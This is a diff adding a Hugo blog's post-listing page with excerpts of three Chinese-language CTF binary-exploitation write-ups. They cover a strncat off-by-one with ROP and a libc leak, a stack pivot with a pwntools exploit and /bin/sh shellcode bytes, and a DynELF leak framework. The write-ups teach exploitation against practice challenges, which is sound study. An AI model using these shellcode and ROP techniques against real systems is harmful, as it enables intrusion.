@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>Posts - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		<link rel="alternate" type="application/rss+xml" href="https://blog.yuuoniy.cn/posts/index.xml" title="Yuuoniy's blog" />
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="list">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+ 
+
+ 
+		<header class="page-header">
+				<h1>Posts</h1>
+			
+		</header>
+
+
+<article class="post-entry">
+	<header class="entry-header">
+		<h2>Bullet</h2>
+	</header>
+	<section class="entry-content">
+	 <p>注意stack或是struct的layout
+漏洞strncat(bullet-&gt;desc,buf,MAX - bullet-&gt;power); 这样首先create长度为47的bullet，通过power_up 再增加一个power 此时bullet长度为48 通过strnact 最后还会赋值 null ,因此造成溢出,power會從\x2f蓋成\x00
+又因为 power = strlen(power) &#43; power 所以最后power为1 杀死gin才会触发return;
+再次powerup的时候,由于len和char间没有\0,strncat会连接到len的后面,从而改写len并rop. 注意payload 中不能有null 由於程式本身有NX保护，必須使用ROP控制程式行為 但許多address因包含null byte，這些address無法被strncat複製到buffer上，因此覆寫main frame的return address時最多只能使用ROP執行某些gadgets。
+再做一次 power_up() 就可以修改掉 power 的值並 overflow 到 main() 的 return address
+最後把 power 改超大殺死 Werewolf 就可以触发 return ，而我们通过溢出修改 return 处的栈帧达到我们的目的 首先要泄露libc 的基址，从而得到system和 bin/sh 的地址，这里借用puts 函数 然后再触发system 函数 所以需要利用两次漏洞，第一次漏洞利用时返回地址应该是 main 。
+内置的ROP怎么用 怎么查看 main的 return address是在overflow之後7個bytes 呢？？？看了半天 使用pattern search 可以算出offset 终于可以写payload了 但是我输入了\xff\xff\xff 为什么就是打不败呢？？
+这是别人的步骤： step1：创建银弹，长度47 step2：补充银弹，长度1 step3：补充银弹，长度47 |\xff * 3| &#43; | junk(四字节)| &#43; | put_addr | &#43; | main_addr | &#43; | got表中存储read的位置| step4：调用beat，打败werewolf step5：函数返回，调用puts，获得read()函数地址，并据此计算出libc基址，以及system、binsh地址等 step6：函数再次执行main，重复step1、step2 step7：补充银弹，长度47 |\xff * 3| &#43; | junk（四字节）| &#43; | system_addr | &#43; |junk（四字节）| &#43; |bin_sh_addr|...</p>
+	</section>
+	<footer class="entry-footer">
+		<time>March 29, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to Bullet post" href="https://blog.yuuoniy.cn/posts/bullet/"></a>
+</article>
+<article class="post-entry">
+	<header class="entry-header">
+		<h2>b0verfl0w</h2>
+	</header>
+	<section class="entry-content">
+	 <p>stack privot 题目 溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。
+基本利用思路如下
+利用栈溢出布置shellcode 控制eip指向shellcode处
+第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。
+ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39; 
+size(shellcode&#43;padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 所以我们最后一段需要执行的指令就是
+sub 0x28,espjmp espMemory layout: | Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting |
+from pwn import *sh = process(&#39;./b0verfl0w&#39;)shellcode = &#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#34;;padding = &#39;a&#39;*13jmp_esp = 0x08048504sub_esp_jmp = asm(&#39;sub esp,0x28;jmp esp&#39;)payload = shellcode&#43;padding&#43;p32(jmp_esp)&#43;sub_esp_jmpsh.sendline(payload)sh.interactive()我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。 解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell...</p>
+	</section>
+	<footer class="entry-footer">
+		<time>March 18, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to b0verfl0w post" href="https://blog.yuuoniy.cn/posts/b0verfl0w/"></a>
+</article>
+<article class="post-entry">
+	<header class="entry-header">
+		<h2>CTF | XDCTF2015-pwn200(DynELF)</h2>
+	</header>
+	<section class="entry-content">
+	 <p>该题用到了 DynELF 技术
+DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。
+p = process(&#39;./xxx&#39;) def leak(address): #各种预处理 payload = &#34;xxxxxxxx&#34; &#43; address &#43; &#34;xxxxxxxx&#34; p.send(payload) #各种处理 data = p.recv(4) return data d = DynELF(leak, elf=ELF(&#34;./xxx&#34;)) #初始化DynELF模块  systemAddress = d.lookup(&#39;system&#39;, &#39;libc&#39;) #在libc文件中搜索system函数的地址 再看 read 函数： 定义函数：ssize_t read(int fd, void * buf, size_t count);  函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数 count 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
+思路：
+1.调用 main 函数循环利用 2.泄露出 system 地址...</p>
+	</section>
+	<footer class="entry-footer">
+		<time>March 18, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to CTF | XDCTF2015-pwn200(DynELF) post" href="https://blog.yuuoniy.cn/posts/xdctf2015-pwn200/"></a>
+</article> 
+<footer class="page-footer">
+	<nav class="pagination">
+		<a class="prev" href="/posts/page/8/">← Prev Page</a>
+		<a class="next" href="/posts/page/10/">Next Page →</a>
+	</nav>
+</footer></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+ 
